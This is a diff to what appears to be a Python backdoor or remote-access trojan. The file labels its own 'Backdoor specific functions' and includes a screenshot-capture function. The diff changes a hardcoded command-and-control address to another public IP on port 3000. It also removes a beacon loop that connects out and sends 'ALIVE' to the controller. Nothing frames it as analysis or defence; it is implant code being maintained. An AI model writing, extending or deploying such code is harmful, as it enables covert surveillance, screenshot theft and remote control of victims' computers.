@@ -1,7 +1,7 @@
 import socket, os, time, subprocess, mss, rsa
 from cryptography.fernet import Fernet 
 
-address = ("206.188.196.139", 3000)
+address = ("138.197.218.142", 3000)
 authed = False
 
 
@@ -86,29 +86,6 @@ def close_connection(sock):
 def reset_connection(sock=None, address=address):
     close_connection(sock=sock)
     return establish_connection(address=address)
-
-
-def ping(ping_address):
-    global server_con, authed
-    while True:
-        try:
-            ping_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            if not authed:
-                ping_server.connect(ping_address)
-                print("Pinging server...")
-                from base64 import b64encode
-                send(data=b64encode(b'ALIVE'), sock=ping_server, is_authed=authed)
-            else:
-                ping_server.shutdown(socket.SHUT_RDWR)
-                ping_server.close()
-                break
-
-        except:
-            pass
-        
-
-
-
 
 # Backdoor specific functions
 def take_screen_shot():
